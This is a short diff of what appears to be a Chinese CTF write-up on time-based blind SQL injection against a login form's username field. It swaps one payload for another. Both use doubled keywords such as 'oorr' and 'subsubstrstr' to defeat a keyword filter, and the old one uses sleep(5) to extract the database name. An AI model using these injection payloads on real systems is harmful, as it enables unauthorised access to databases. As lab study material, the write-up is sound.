@@ -1017,7 +1017,7 @@ gobuster进行目录扫描：
 [嘤嘤嘤]timesql #SQL注入漏洞 时间盲注
 爆数据库名
 ```
-username=114514' oorr iiff(subsubstrstr(database(),§1§,1)='§z§',slesleepep(5),3)--+&password=114514
+username=admin'%20anandd%20subsubstrstr(database()%2c§1§%2c1)%3d'§2§'%20%23&password=114514
 ```
 ![[Pasted image 20240327161324.png]]
 爆表名长度
